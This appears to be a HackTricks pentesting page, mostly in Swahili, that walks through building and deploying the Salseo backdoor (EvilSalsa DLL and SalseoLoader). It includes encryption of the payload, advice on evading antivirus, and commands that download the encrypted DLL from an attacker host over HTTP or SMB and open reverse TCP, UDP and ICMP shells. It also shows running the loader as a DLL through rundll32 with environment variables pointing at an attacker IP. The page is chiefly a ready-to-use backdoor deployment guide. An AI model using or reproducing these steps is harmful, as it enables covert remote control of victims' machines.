# Salseo

{{#include ../banners/hacktricks-training.md}}

## Compiling the binaries

Pakua msimbo wa chanzo kutoka github na uunde **EvilSalsa** na **SalseoLoader**. Utahitaji **Visual Studio** iliyosakinishwa ili kuunda msimbo huo.

Unda miradi hiyo kwa ajili ya usanifu wa sanduku la windows ambapo utatumia (Ikiwa Windows inasaidia x64 uunde kwa usanifu huo).

Unaweza **kuchagua usanifu** ndani ya Visual Studio katika **"Build" Tab** ya kushoto katika **"Platform Target".**

(**Ikiwa huwezi kupata chaguo hizi bonyeza kwenye **"Project Tab"** kisha kwenye **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Kisha, jenga miradi yote miwili (Build -> Build Solution) (Ndani ya logi zitaonekana njia ya executable):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Prepare the Backdoor

Kwanza kabisa, utahitaji kuandika **EvilSalsa.dll.** Ili kufanya hivyo, unaweza kutumia skripti ya python **encrypterassembly.py** au unaweza kuunda mradi **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Sawa, sasa una kila kitu unachohitaji kutekeleza mambo yote ya Salseo: **EvilDalsa.dll iliyosimbwa** na **binary ya SalseoLoader.**

**Pakia binary ya SalseoLoader.exe kwenye mashine. Hazipaswi kugundulika na AV yoyote...**

## **Tekeleza backdoor**

### **Kupata shell ya TCP reverse (kupakua dll iliyosimbwa kupitia HTTP)**

Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse na seva ya HTTP kutoa evilsalsa iliyosimbwa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Kupata shell ya UDP reverse (kupakua dll iliyokodishwa kupitia SMB)**

Kumbuka kuanzisha nc kama msikilizaji wa shell ya reverse, na seva ya SMB kutoa evilsalsa iliyokodishwa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Kupata shell ya ICMP reverse (dll iliyosimbwa tayari ndani ya mwathirika)**

**Wakati huu unahitaji chombo maalum kwenye mteja kupokea shell ya reverse. Pakua:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Zima Majibu ya ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Tekeleza mteja:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Ndani ya mwathirika, hebu tuendeshe kitu cha salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kuunda SalseoLoader kama DLL inayosafirisha kazi kuu

Fungua mradi wa SalseoLoader ukitumia Visual Studio.

### Ongeza kabla ya kazi kuu: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Sakinisha DllExport kwa mradi huu

#### **Zana** --> **Meneja wa Kifurushi cha NuGet** --> **Simamisha Kifurushi cha NuGet kwa Suluhisho...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Tafuta kifurushi cha DllExport (ukitumia tab ya Kagua), na bonyeza Sakinisha (na kubali popup)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Katika folda yako ya mradi, faili zifuatazo zimeonekana: **DllExport.bat** na **DllExport_Configure.bat**

### **U**ondoe DllExport

Bonyeza **Ondoa** (ndiyo, ni ajabu lakini ni muhimu)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Toka Visual Studio na tekeleza DllExport_configure**

Tu **toka** Visual Studio

Kisha, nenda kwenye **folda ya SalseoLoader** yako na **tekeleza DllExport_Configure.bat**

Chagua **x64** (ikiwa unakusudia kuitumia ndani ya sanduku la x64, hiyo ilikuwa hali yangu), chagua **System.Runtime.InteropServices** (ndani ya **Namespace kwa DllExport**) na bonyeza **Tumia**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Fungua mradi tena na visual Studio**

**\[DllExport]** haipaswi kuwa na alama ya kosa tena

![](<../images/image (8) (1).png>)

### Jenga suluhisho

Chagua **Aina ya Matokeo = Maktaba ya Darasa** (Mradi --> SalseoLoader Mali --> Programu --> Aina ya matokeo = Maktaba ya Darasa)

![](<../images/image (10) (1).png>)

Chagua **jukwaa la x64** (Mradi --> SalseoLoader Mali --> Jenga --> Lengo la jukwaa = x64)

![](<../images/image (9) (1) (1).png>)

Ili **kujenga** suluhisho: Jenga --> Jenga Suluhisho (Ndani ya console ya Matokeo, njia ya DLL mpya itaonekana)

### Jaribu Dll iliyozalishwa

Nakili na ubandike Dll mahali unapotaka kuijaribu.

Tekeleza:
```
rundll32.exe SalseoLoader.dll,main
```
Ikiwa hakuna kosa linalojitokeza, huenda una DLL inayofanya kazi!!

## Pata shell ukitumia DLL

Usisahau kutumia **HTTP** **server** na kuweka **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
